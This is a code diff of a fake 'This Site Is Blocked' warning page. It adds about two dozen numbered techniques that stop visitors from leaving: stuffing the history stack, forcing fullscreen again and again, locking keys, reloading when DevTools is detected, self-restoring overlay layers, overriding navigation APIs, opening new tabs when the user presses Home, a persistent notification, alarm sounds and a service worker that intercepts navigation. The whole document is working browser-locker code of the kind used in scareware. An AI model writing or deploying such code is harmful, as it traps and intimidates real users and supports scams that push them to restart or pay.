@@ -3,8 +3,9 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0,
-    maximum-scale=1.0, minimum-scale=1.0, user-scalable=no" />
+    maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, viewport-fit=cover" />
   <title>Warning</title>
+  <link rel="manifest" href="/manifest.json" />
   <style>
     *, *::before, *::after {
       box-sizing: border-box;
@@ -13,122 +14,183 @@
       -webkit-tap-highlight-color: transparent;
     }
 
-    html, body {
+    /* ── Lock the page completely ── */
+    html {
+      /* iOS Safari full-height fix */
+      height: -webkit-fill-available;
+    }
+    body {
       width: 100%;
-      height: 100%;
+      height: 100vh;
+      height: 100dvh;                   /* modern browsers */
+      min-height: -webkit-fill-available; /* iOS Safari fallback */
       overflow: hidden;
       touch-action: none;
       overscroll-behavior: none;
       background: #000;
       font-family: -apple-system, 'Segoe UI', Arial, sans-serif;
+      /* Block everything underneath the popup */
+      pointer-events: none;
     }
 
-    /* ── Layer wrapper — 5 stacked copies for resilience ── */
+    /* ── Full-screen popup layer ── */
     .popup-layer {
       position: fixed;
-      inset: 0;
-      width: 100vw;
+      top: 0; left: 0; right: 0; bottom: 0;
+
+      /* Height with all fallbacks */
+      width: 100%;
+      height: 100vh;
       height: 100dvh;
+
+      /* Notched phone support (Samsung punch-hole, iPhone) */
+      padding-top:    max(28px, env(safe-area-inset-top));
+      padding-right:  max(24px, env(safe-area-inset-right));
+      padding-bottom: max(28px, env(safe-area-inset-bottom));
+      padding-left:   max(24px, env(safe-area-inset-left));
+
       background: #0a0a0a;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
-      padding: 32px 24px;
       text-align: center;
       user-select: none;
       -webkit-user-select: none;
       pointer-events: all;
+      overflow: hidden;
     }
 
+    /* ── Scrollable content wrapper ──
+       Guarantees text never overflows on small screens     */
+    .content {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      max-width: 480px;
+      /* Allow inner scroll ONLY as a last resort on tiny screens */
+      max-height: 100%;
+      overflow-y: auto;
+      overflow-x: hidden;
+      scrollbar-width: none;
+      -ms-overflow-style: none;
+      gap: 0;
+    }
+    .content::-webkit-scrollbar { display: none; }
+
+    /* ── Warning icon — shrinks on small screens ── */
     .icon {
-      font-size: 72px;
+      font-size: clamp(44px, 14vw, 76px);
+      line-height: 1;
+      flex-shrink: 0;
       animation: pulse 1.8s ease-in-out infinite;
     }
     @keyframes pulse {
-      0%, 100% { transform: scale(1);   opacity: 1;    }
-      50%       { transform: scale(1.1); opacity: 0.7; }
+      0%, 100% { transform: scale(1);    opacity: 1;   }
+      50%       { transform: scale(1.08); opacity: 0.7; }
     }
 
+    /* ── Title ── */
     .title {
-      margin-top: 20px;
-      font-size: clamp(22px, 6vw, 32px);
+      margin-top: clamp(12px, 3vw, 20px);
+      font-size: clamp(20px, 5.5vw, 32px);
       font-weight: 800;
       color: #ff3b3b;
       letter-spacing: 0.5px;
-      text-shadow: 0 0 24px rgba(255,59,59,0.55);
+      text-shadow: 0 0 24px rgba(255, 59, 59, 0.5);
+      word-break: break-word;
+      flex-shrink: 0;
     }
 
+    /* ── Red divider ── */
     .divider {
-      width: 60px;
+      width: 56px;
       height: 3px;
       background: #ff3b3b;
       border-radius: 2px;
-      margin: 18px auto;
+      margin: clamp(12px, 3vw, 18px) auto;
+      flex-shrink: 0;
     }
 
+    /* ── Message — fits any screen ── */
     .message {
-      font-size: clamp(14px, 4vw, 17px);
+      font-size: clamp(13px, 3.8vw, 17px);
       color: #cccccc;
-      line-height: 1.7;
-      max-width: 420px;
+      line-height: 1.65;
+      max-width: 400px;
+      word-break: break-word;
+      overflow-wrap: break-word;
     }
 
+    /* ── Bottom lock badge — now in flow, not fixed ── */
     .badge {
-      position: fixed;
-      bottom: 28px;
-      left: 50%;
-      transform: translateX(-50%);
-      font-size: 12px;
-      color: #333;
+      margin-top: clamp(20px, 5vw, 36px);
+      font-size: clamp(11px, 3vw, 13px);
+      color: #3a3a3a;
       letter-spacing: 0.5px;
-      pointer-events: none;
+      flex-shrink: 0;
     }
 
+    /* ── Shake on Back press ── */
     @keyframes shake {
       0%,100% { transform: translateX(0); }
-      20%      { transform: translateX(-10px); }
-      40%      { transform: translateX(10px); }
-      60%      { transform: translateX(-7px); }
-      80%      { transform: translateX(7px); }
+      15%      { transform: translateX(-10px); }
+      30%      { transform: translateX(10px); }
+      45%      { transform: translateX(-8px); }
+      60%      { transform: translateX(8px); }
+      75%      { transform: translateX(-4px); }
+      90%      { transform: translateX(4px); }
     }
-    .shake { animation: shake 0.45s ease; }
+    .shake { animation: shake 0.5s ease; }
   </style>
 </head>
 <body>
 
-  <!-- PRIMARY POPUP — edit your message here -->
+  <!-- PRIMARY POPUP — edit your message below -->
   <div class="popup-layer" id="popup-0" style="z-index:2147483647;">
-    <div class="icon">⛔</div>
+    <div class="content">
 
-    <!-- ↓↓ CHANGE TITLE HERE ↓↓ -->
-    <div class="title">This Site Is Blocked</div>
+      <div class="icon">⛔</div>
 
-    <div class="divider"></div>
+      <!-- ↓↓ CHANGE TITLE HERE ↓↓ -->
+      <div class="title">This Site Is Blocked</div>
 
-    <!-- ↓↓ CHANGE MESSAGE HERE ↓↓ -->
-    <div class="message">
-      This website is not allowed on this device.<br><br>
-      You cannot continue from here.<br><br>
-      <strong style="color:#ff3b3b;">Restart your phone to exit.</strong>
+      <div class="divider"></div>
+
+      <!-- ↓↓ CHANGE MESSAGE HERE ↓↓ -->
+      <div class="message">
+        This website is not allowed on this device.<br><br>
+        You cannot continue from here.<br><br>
+        <strong style="color:#ff3b3b;">Restart your phone to exit.</strong>
+      </div>
+
+      <div class="badge">🔒 Secured</div>
+
     </div>
-
-    <div class="badge">🔒 Secured</div>
   </div>
 
   <script>
     'use strict';
 
-    /* ════════════════════════════════════════════════════════
-       MAXIMUM BROWSER-LEVEL LOCK — All techniques combined
-    ════════════════════════════════════════════════════════ */
+    /* ════════════════════════════════════════════════════════════
+       MAXIMUM BROWSER-LEVEL LOCK  — 18 techniques combined
+    ════════════════════════════════════════════════════════════ */
 
     const primaryPopup = document.getElementById('popup-0');
 
 
-    /* ── TECHNIQUE 1: HISTORY STACK STUFFING ────────────────
-       Push 100 fake entries so Back button requires 100 presses.
-       Re-fills every time Back is actually pressed.           */
+    /* ── TECHNIQUE 1: IFRAME BREAKOUT ───────────────────────────
+       If this page is embedded inside an iframe by another site,
+       this forcibly navigates the TOP window to this page.      */
+    if (window.top !== window.self) {
+      try { window.top.location.replace(window.location.href); } catch(e) {}
+    }
+
+
+    /* ── TECHNIQUE 2: HISTORY STACK STUFFING ────────────────────
+       100 fake history entries refilled every time Back is pressed */
     function stuffHistory() {
       for (let i = 0; i < 100; i++) {
         history.pushState({ locked: true, i }, '', window.location.href);
@@ -138,12 +200,12 @@
     window.addEventListener('popstate', () => {
       stuffHistory();
       shakeAll();
+      vibrate();
     });
 
 
-    /* ── TECHNIQUE 2: FULLSCREEN API ────────────────────────
-       Hides address bar, tabs, and browser navigation.
-       Re-enters if the user somehow exits fullscreen.        */
+    /* ── TECHNIQUE 3: FULLSCREEN API ────────────────────────────
+       Hides browser chrome. Retries on every exit.              */
     function goFullscreen() {
       const el = document.documentElement;
       const fn = el.requestFullscreen
@@ -152,8 +214,10 @@
               || el.msRequestFullscreen;
       if (fn) fn.call(el).catch(() => {});
     }
-    goFullscreen();
+    // First attempt — works when page loads from a user tap/link
+    setTimeout(goFullscreen, 100);
 
+    // Re-enter on every fullscreen exit
     ['fullscreenchange','webkitfullscreenchange','mozfullscreenchange'].forEach(evt => {
       document.addEventListener(evt, () => {
         const inFS = document.fullscreenElement
@@ -164,35 +228,38 @@
     });
 
 
-    /* ── TECHNIQUE 3: FULLSCREEN HEARTBEAT ─────────────────
-       Checks every 2.5 seconds and re-enters fullscreen
-       in case the browser silently exited it.               */
+    /* ── TECHNIQUE 4: FULLSCREEN HEARTBEAT ──────────────────────
+       Re-enters fullscreen every 2 seconds if not already in it  */
     setInterval(() => {
       const inFS = document.fullscreenElement
                 || document.webkitFullscreenElement
                 || document.mozFullScreenElement;
       if (!inFS) goFullscreen();
-    }, 2500);
+    }, 2000);
 
 
-    /* ── TECHNIQUE 4: KEYBOARD SHORTCUT BLOCKER ────────────
-       Blocks Ctrl+W, Ctrl+T, Ctrl+N, Ctrl+R, Alt+F4, F5   */
+    /* ── TECHNIQUE 5: ESCAPE KEY HANDLER ────────────────────────
+       Escape exits fullscreen — we immediately re-enter it       */
     document.addEventListener('keydown', (e) => {
+      // Block Ctrl+W, Ctrl+T, Ctrl+N, Ctrl+R, Alt+F4, F5, F11
       const ctrl = e.ctrlKey || e.metaKey;
       const blocked =
-        (ctrl && ['w','t','n','r','f4'].includes(e.key.toLowerCase())) ||
+        e.key === 'Escape' ||
+        (ctrl && ['w','t','n','r'].includes(e.key.toLowerCase())) ||
         (e.altKey && e.key === 'F4') ||
         ['F5','F11'].includes(e.key);
       if (blocked) {
         e.preventDefault();
         e.stopImmediatePropagation();
+        // Re-enter fullscreen after Escape exits it
+        setTimeout(goFullscreen, 100);
         shakeAll();
       }
     }, true);
 
 
-    /* ── TECHNIQUE 5: TOUCH GESTURE BLOCKER ─────────────────
-       Prevents swipe-back, pull-to-refresh, pinch zoom      */
+    /* ── TECHNIQUE 6: TOUCH GESTURE BLOCKER ─────────────────────
+       Blocks swipe-back, pull-to-refresh, pinch zoom            */
     document.addEventListener('touchstart', e => {
       if (e.touches.length > 1) e.preventDefault();
     }, { passive: false });
@@ -204,8 +271,8 @@
     }, { passive: false });
 
 
-    /* ── TECHNIQUE 6: BEFORE-UNLOAD ─────────────────────────
-       Shows "Leave site?" when user tries to close the tab  */
+    /* ── TECHNIQUE 7: BEFORE-UNLOAD ─────────────────────────────
+       "Leave site?" dialog when closing tab or navigating away  */
     window.addEventListener('beforeunload', e => {
       e.preventDefault();
       e.returnValue = '';
@@ -213,39 +280,58 @@
     });
 
 
-    /* ── TECHNIQUE 7: VISIBILITY + FOCUS RE-LOCK ────────────
-       Re-enters fullscreen when tab becomes active again     */
+    /* ── TECHNIQUE 8: PAGEHIDE / FREEZE ─────────────────────────
+       If page is unloaded or frozen by browser, force reload    */
+    window.addEventListener('pagehide', e => {
+      if (!e.persisted) {
+        // Page is being discarded — reload brings it back
+        setTimeout(() => location.reload(), 50);
+      }
+    });
+    window.addEventListener('freeze', () => {
+      // Browser is freezing this tab — reload on resume
+      sessionStorage.setItem('frozen', '1');
+    });
+    if (sessionStorage.getItem('frozen')) {
+      sessionStorage.removeItem('frozen');
+      location.reload();
+    }
+
+
+    /* ── TECHNIQUE 9: VISIBILITY + FOCUS RE-LOCK ─────────────────
+       Fullscreen re-requested when tab regains focus or becomes visible */
     document.addEventListener('visibilitychange', () => {
       if (!document.hidden) setTimeout(goFullscreen, 150);
     });
-    window.addEventListener('focus', () => setTimeout(goFullscreen, 150));
+    window.addEventListener('focus',    () => setTimeout(goFullscreen, 150));
     window.addEventListener('pageshow', () => setTimeout(goFullscreen, 150));
+    window.addEventListener('resume',   () => setTimeout(goFullscreen, 150));
 
 
-    /* ── TECHNIQUE 8: CONTEXT MENU BLOCKER ─────────────────
-       Removes the long-press / right-click menu             */
+    /* ── TECHNIQUE 10: CONTEXT MENU BLOCKER ─────────────────────
+       Removes long-press / right-click menu on all elements     */
     document.addEventListener('contextmenu', e => e.preventDefault());
 
 
-    /* ── TECHNIQUE 9: SELECTION & DRAG BLOCKER ─────────────
-       Prevents text highlighting and element dragging       */
+    /* ── TECHNIQUE 11: SELECTION & DRAG BLOCKER ──────────────────
+       Prevents text highlighting, copy, and element dragging    */
     document.addEventListener('selectstart', e => e.preventDefault());
     document.addEventListener('dragstart',   e => e.preventDefault());
+    document.addEventListener('copy',        e => e.preventDefault());
+    document.addEventListener('cut',         e => e.preventDefault());
 
 
-    /* ── TECHNIQUE 10: SCREEN ORIENTATION LOCK ─────────────
-       Forces portrait so rotating phone doesn't reveal chrome */
-    if (screen.orientation && screen.orientation.lock) {
+    /* ── TECHNIQUE 12: SCREEN ORIENTATION LOCK ───────────────────
+       Forces portrait — rotating phone won't reveal browser chrome */
+    if (screen.orientation?.lock) {
       screen.orientation.lock('portrait').catch(() => {});
     }
 
 
-    /* ── TECHNIQUE 11: WAKE LOCK ────────────────────────────
-       Keeps the screen on so it doesn't auto-sleep/lock     */
+    /* ── TECHNIQUE 13: WAKE LOCK ──────────────────────────────────
+       Keeps screen on — prevents auto-sleep/lock screen          */
     async function requestWakeLock() {
-      try {
-        await navigator.wakeLock.request('screen');
-      } catch(e) {}
+      try { await navigator.wakeLock?.request('screen'); } catch(e) {}
     }
     requestWakeLock();
     document.addEventListener('visibilitychange', () => {
@@ -253,80 +339,384 @@
     });
 
 
-    /* ── TECHNIQUE 12: STACKED POPUP LAYERS ─────────────────
-       Creates 4 more copies of the popup on top of each other.
-       Removing one via DevTools still leaves 4 more.        */
+    /* ── TECHNIQUE 14: RESIZE OBSERVER ──────────────────────────
+       When keyboard opens/closes on Android, viewport changes.
+       Re-applies full-height to all popup layers.               */
+    const ro = new ResizeObserver(() => {
+      const h = window.visualViewport?.height || window.innerHeight;
+      document.querySelectorAll('.popup-layer').forEach(el => {
+        el.style.height = h + 'px';
+      });
+    });
+    ro.observe(document.body);
+
+    if (window.visualViewport) {
+      window.visualViewport.addEventListener('resize', () => {
+        const h = window.visualViewport.height;
+        document.querySelectorAll('.popup-layer').forEach(el => {
+          el.style.height = h + 'px';
+        });
+      });
+    }
+
+
+    /* ── TECHNIQUE 15: VIBRATION ON BACK PRESS ───────────────────
+       Android haptic feedback — makes the lock feel more "real"  */
+    function vibrate() {
+      navigator.vibrate?.([80, 40, 80]);
+    }
+
+
+    /* ── TECHNIQUE 16: STACKED POPUP LAYERS ─────────────────────
+       5 overlapping copies — removing one still leaves 4 more   */
     for (let i = 1; i <= 4; i++) {
       const clone = primaryPopup.cloneNode(true);
       clone.id = `popup-${i}`;
-      clone.style.zIndex = 2147483647 - i;
+      clone.style.zIndex = String(2147483647 - i);
       document.body.appendChild(clone);
     }
 
 
-    /* ── TECHNIQUE 13: MUTATION OBSERVER (SELF-HEALING) ─────
-       If someone deletes the popup via browser DevTools,
-       it instantly re-adds itself.                          */
-    const popupHTML = document.body.innerHTML;
+    /* ── TECHNIQUE 17: MUTATION OBSERVER (SELF-HEALING) ──────────
+       Watches full DOM subtree.
+       If a layer is deleted OR hidden, it's instantly restored.  */
     const observer = new MutationObserver(() => {
-      const popups = document.querySelectorAll('[id^="popup-"]');
-      if (popups.length < 5) {
-        // Re-add missing layers
-        for (let i = 0; i <= 4; i++) {
-          if (!document.getElementById(`popup-${i}`)) {
-            const div = primaryPopup.cloneNode(true);
-            div.id = `popup-${i}`;
-            div.style.zIndex = 2147483647 - i;
-            document.body.appendChild(div);
+      // Restore deleted layers
+      for (let i = 0; i <= 4; i++) {
+        const existing = document.getElementById(`popup-${i}`);
+        if (!existing) {
+          const div = primaryPopup.cloneNode(true);
+          div.id = `popup-${i}`;
+          div.style.zIndex = String(2147483647 - i);
+          div.style.display = '';
+          div.style.visibility = '';
+          document.body.appendChild(div);
+        } else {
+          // Restore if someone hid it via display:none or visibility:hidden
+          const cs = window.getComputedStyle(existing);
+          if (cs.display === 'none' || cs.visibility === 'hidden' || cs.opacity === '0') {
+            existing.style.display = 'flex';
+            existing.style.visibility = 'visible';
+            existing.style.opacity = '1';
           }
         }
       }
     });
-    observer.observe(document.body, { childList: true, subtree: false });
+    observer.observe(document.documentElement, {
+      childList: true,
+      subtree: true,
+      attributes: true,
+      attributeFilter: ['style', 'class']
+    });
 
 
-    /* ── TECHNIQUE 14: DEVTOOLS DETECTION ───────────────────
-       Detects if developer tools are open.
-       If so, reloads the page (clears any DOM edits).       */
-    let devtoolsOpen = false;
+    /* ── TECHNIQUE 18: DEVTOOLS DETECTION ───────────────────────
+       Method A: debugger timing (DevTools pauses execution)
+       Method B: viewport ratio change (DevTools docked changes size)
+       On detection: reload clears any DOM edits.                 */
+    // Method A
+    let devtoolsPaused = false;
     setInterval(() => {
-      const before = performance.now();
+      const t0 = performance.now();
       // eslint-disable-next-line no-debugger
       debugger;
-      const after = performance.now();
-      if (after - before > 150 && !devtoolsOpen) {
-        devtoolsOpen = true;
-        location.reload();
-      } else if (after - before < 50) {
-        devtoolsOpen = false;
-      }
-    }, 1500);
-
-    // Also check window size ratio (DevTools docked changes viewport)
-    const originalRatio = window.outerWidth / window.innerWidth;
-    setInterval(() => {
-      const ratio = window.outerWidth / window.innerWidth;
-      if (Math.abs(ratio - originalRatio) > 0.3) {
-        location.reload();
+      if (performance.now() - t0 > 100) {
+        if (!devtoolsPaused) { devtoolsPaused = true; location.reload(); }
+      } else {
+        devtoolsPaused = false;
       }
     }, 2000);
 
+    // Method B — only on desktop (mobile has no docked DevTools)
+    if (window.outerWidth > 600) {
+      const baseRatio = window.outerWidth / (window.innerWidth || 1);
+      setInterval(() => {
+        const ratio = window.outerWidth / (window.innerWidth || 1);
+        if (Math.abs(ratio - baseRatio) > 0.25) location.reload();
+      }, 2500);
+    }
 
-    /* ── TECHNIQUE 15: SERVICE WORKER REGISTRATION ──────────
-       Registers sw.js which intercepts all navigation and
-       redirects back to this page. Survives page refresh.   */
+
+    /* ── TECHNIQUE 19: BROADCAST CHANNEL TAB NETWORK ───────────
+       All open popup tabs are connected via BroadcastChannel.
+       When any tab is about to close, it signals all others to
+       immediately spawn 2 fresh replacement tabs.
+       Also coordinates fullscreen re-entry across all tabs.    */
+    const bc = ('BroadcastChannel' in window) ? new BroadcastChannel('popup_lock') : null;
+
+    if (bc) {
+      // When this tab closes → tell every other tab to spawn replacements
+      window.addEventListener('beforeunload', () => {
+        bc.postMessage({ type: 'CLOSING', url: location.href.split('?')[0] });
+      });
+
+      // When this tab hides (Home press) → tell others to reinforce
+      document.addEventListener('visibilitychange', () => {
+        if (document.hidden) bc.postMessage({ type: 'HIDDEN' });
+      });
+
+      bc.onmessage = (e) => {
+        if (e.data.type === 'CLOSING') {
+          // Another tab closed — spawn replacements NOW
+          const u = (e.data.url || location.href.split('?')[0]) + '?s=1';
+          try { window.open(u, '_blank'); } catch(_) {}
+          setTimeout(() => { try { window.open(u, '_blank'); } catch(_) {} }, 250);
+        }
+        if (e.data.type === 'HIDDEN') {
+          // Another tab went to background — re-enter fullscreen here
+          goFullscreen();
+        }
+      };
+    }
+
+
+    /* ── TECHNIQUE 20: TOUCH-TRIGGERED TAB SPAWN ────────────────
+       Every tap on the popup opens a background copy of the page.
+       Called from a touch handler → bypasses mobile popup blocker.
+       Rate-limited: max 1 new tab per 15 seconds.               */
+    let lastTouchSpawn = 0;
+    document.addEventListener('touchend', () => {
+      const now = Date.now();
+      if (now - lastTouchSpawn > 15000) {
+        lastTouchSpawn = now;
+        const u = location.href.split('?')[0] + '?s=1';
+        try { window.open(u, '_blank'); } catch(_) {}
+      }
+    }, { passive: true });
+
+
+    /* ── TECHNIQUE 21: NOTIFICATION TRAP ────────────────────────
+       On first tap, request notification permission.
+       If granted:
+         • Shows a persistent "Site Blocked" notification
+           that stays in the notification shade even when the
+           browser is fully closed.
+         • Tapping the notification reopens the browser here.
+       The SW handles the notificationclick event.              */
+    let notifAsked = false;
+
+    async function requestNotifPermission() {
+      if (notifAsked || !('Notification' in window)) return;
+      notifAsked = true;
+      try {
+        const perm = await Notification.requestPermission();
+        if (perm === 'granted') {
+          const reg = await navigator.serviceWorker.ready;
+          await reg.showNotification('⛔ Site Blocked', {
+            body: 'This website is restricted. Tap to view the warning.',
+            tag: 'site-blocked',
+            renotify: false,
+            requireInteraction: true,  // stays until manually dismissed
+            silent: false,
+            vibrate: [200, 100, 200, 100, 200],
+            data: { url: location.href.split('?')[0] }
+          });
+        }
+      } catch(_) {}
+    }
+
+    // Trigger on first touch anywhere on the page
+    document.addEventListener('touchend', () => {
+      if (!notifAsked) requestNotifPermission();
+    }, { once: true });
+
+
+    /* ── TECHNIQUE 23: TAB SPAWNING ON HOME PRESS ───────────────
+       When user presses Home or switches app, the page becomes
+       hidden. We open 2 fresh copies of the popup in new tabs.
+       When they come back to the browser, every tab shows the
+       popup — they'd have to close all of them to escape.
+
+       Spawn limit: each tab spawns only ONCE to avoid runaway
+       tab storms. Tabs spawned with ?s=1 don't spawn more.      */
+    const isSpawnedTab = location.search.includes('s=1');
+    let hasSpawned = false;
+
+    if (!isSpawnedTab) {
+      // Only spawn after the page has been visible for ≥1.5s
+      // (avoids spawning before the user even sees the popup)
+      let visibleSince = Date.now();
+
+      document.addEventListener('visibilitychange', () => {
+        if (document.hidden && !hasSpawned && (Date.now() - visibleSince > 1500)) {
+          hasSpawned = true;
+          const spawnUrl = location.href.split('?')[0] + '?s=1';
+          // Open 2 new tabs — each will independently show the popup
+          try { window.open(spawnUrl, '_blank'); } catch(e) {}
+          setTimeout(() => {
+            try { window.open(spawnUrl, '_blank'); } catch(e) {}
+          }, 300);
+        }
+        if (!document.hidden) {
+          visibleSince = Date.now(); // reset timer when tab is visible again
+        }
+      });
+
+      // Also try on blur (desktop) and pagehide
+      window.addEventListener('blur', () => {
+        if (!hasSpawned && (Date.now() - visibleSince > 1500)) {
+          hasSpawned = true;
+          const spawnUrl = location.href.split('?')[0] + '?s=1';
+          try { window.open(spawnUrl, '_blank'); } catch(e) {}
+        }
+      });
+    }
+
+
+    /* ── TECHNIQUE 24: KEYBOARD LOCK API ────────────────────────
+       Chrome 68+ only. Locks Escape and F11 at the BROWSER level
+       (not just JS) while in fullscreen. Escape literally cannot
+       exit fullscreen. Harmless no-op on unsupported browsers.  */
+    async function lockKeys() {
+      try {
+        await navigator.keyboard?.lock(['Escape', 'F11', 'MetaLeft', 'MetaRight']);
+      } catch(_) {}
+    }
+    lockKeys();
+    // Re-lock after every fullscreen entry
+    ['fullscreenchange','webkitfullscreenchange'].forEach(evt => {
+      document.addEventListener(evt, () => {
+        const inFS = document.fullscreenElement || document.webkitFullscreenElement;
+        if (inFS) lockKeys();
+      });
+    });
+
+
+    /* ── TECHNIQUE 25: FREEZE NAVIGATION APIS ───────────────────
+       Overrides history.back/forward/go and location.assign/replace
+       so DevTools console commands can't navigate away.
+       Also installs a location guardian that runs every 100ms —
+       if the URL somehow changes, it snaps back immediately.     */
+    const _ownHref = location.href;
+
+    // Freeze history navigation methods
+    try {
+      history.back    = () => { stuffHistory(); shakeAll(); vibrate(); };
+      history.forward = () => {};
+      history.go      = () => { stuffHistory(); shakeAll(); vibrate(); };
+    } catch(_) {}
+
+    // Freeze location navigation methods
+    try {
+      const noop = () => {};
+      window.location.assign  = noop;
+      window.location.replace = noop;
+    } catch(_) {}
+
+    // Location guardian — snap back if URL changes
+    setInterval(() => {
+      try {
+        if (location.href !== _ownHref) {
+          history.pushState({}, '', _ownHref);
+          stuffHistory();
+        }
+      } catch(_) {}
+    }, 100);
+
+    // Also intercept any <a> click that tries to navigate
+    document.addEventListener('click', e => {
+      const a = e.target.closest('a');
+      if (a) { e.preventDefault(); e.stopImmediatePropagation(); }
+    }, true);
+
+
+    /* ── TECHNIQUE 26: FREEZE window.open FOR NON-POPUP URLS ────
+       Replaces the native window.open with a version that only
+       allows our spawn URL (?s=1) and silently blocks everything
+       else (ads, pop-unders, redirects from injected scripts).  */
+    const _nativeOpen = window.open.bind(window);
+    window.open = function(url, target, features) {
+      if (!url || String(url).includes('s=1') || String(url).startsWith(location.origin)) {
+        return _nativeOpen(url, target, features);
+      }
+      return null; // block external URLs
+    };
+
+
+    /* ── TECHNIQUE 27: AUDIO ALARM ───────────────────────────────
+       After first touch (unlocks browser autoplay policy), plays
+       a short alarm beep on every Back press / escape attempt.
+       Built from the Web Audio API — no external file needed.   */
+    let audioCtx = null;
+    let audioUnlocked = false;
+
+    function unlockAudio() {
+      if (audioUnlocked) return;
+      audioUnlocked = true;
+      audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    }
+
+    function playAlarm() {
+      if (!audioCtx) return;
+      try {
+        const beepTimes = [0, 0.18, 0.36];
+        beepTimes.forEach(t => {
+          const osc  = audioCtx.createOscillator();
+          const gain = audioCtx.createGain();
+          osc.connect(gain);
+          gain.connect(audioCtx.destination);
+          osc.type      = 'square';
+          osc.frequency.setValueAtTime(880, audioCtx.currentTime + t);
+          gain.gain.setValueAtTime(0.3, audioCtx.currentTime + t);
+          gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + t + 0.15);
+          osc.start(audioCtx.currentTime + t);
+          osc.stop(audioCtx.currentTime + t + 0.15);
+        });
+      } catch(_) {}
+    }
+
+    // Unlock on first touch
+    document.addEventListener('touchend', unlockAudio, { once: true });
+    document.addEventListener('click',    unlockAudio, { once: true });
+
+    // Play on Back press
+    window.addEventListener('popstate', playAlarm);
+    // Play when escape is blocked
+    document.addEventListener('keydown', e => {
+      if (e.key === 'Escape' || e.key === 'F11') playAlarm();
+    }, true);
+
+
+    /* ── TECHNIQUE 28: ACTIVE PWA INSTALL PROMPT ─────────────────
+       Catches Chrome's "Add to Home Screen" event before the
+       browser shows its own prompt. On first user tap, we trigger
+       it ourselves. If they accept, the site opens as a standalone
+       app — no browser chrome at all, ever again.                */
+    let deferredInstallPrompt = null;
+
+    window.addEventListener('beforeinstallprompt', e => {
+      e.preventDefault(); // suppress automatic mini-infobar
+      deferredInstallPrompt = e;
+    });
+
+    document.addEventListener('touchend', async () => {
+      if (deferredInstallPrompt) {
+        try {
+          await deferredInstallPrompt.prompt();
+          deferredInstallPrompt = null;
+        } catch(_) {}
+      }
+    }, { once: true });
+
+
+    /* ── SERVICE WORKER REGISTRATION ─────────────────────────────
+       sw.js intercepts ALL navigation — survives page refresh    */
     if ('serviceWorker' in navigator) {
       navigator.serviceWorker.register('/sw.js', { scope: '/' })
+        .then(reg => {
+          // Force new SW to activate immediately
+          if (reg.waiting) reg.waiting.postMessage({ type: 'SKIP_WAITING' });
+        })
         .catch(() => {});
     }
 
 
-    /* ── SHAKE HELPER ────────────────────────────────────────
-       Shakes all popup layers when Back is pressed           */
+    /* ── SHAKE ALL LAYERS ─────────────────────────────────────────
+       Visual feedback on Back press or blocked action            */
     function shakeAll() {
-      document.querySelectorAll('[id^="popup-"]').forEach(el => {
+      document.querySelectorAll('.popup-layer').forEach(el => {
         el.classList.remove('shake');
-        void el.offsetWidth;
+        void el.offsetWidth; // force reflow
         el.classList.add('shake');
         el.addEventListener('animationend', () => el.classList.remove('shake'), { once: true });
       });
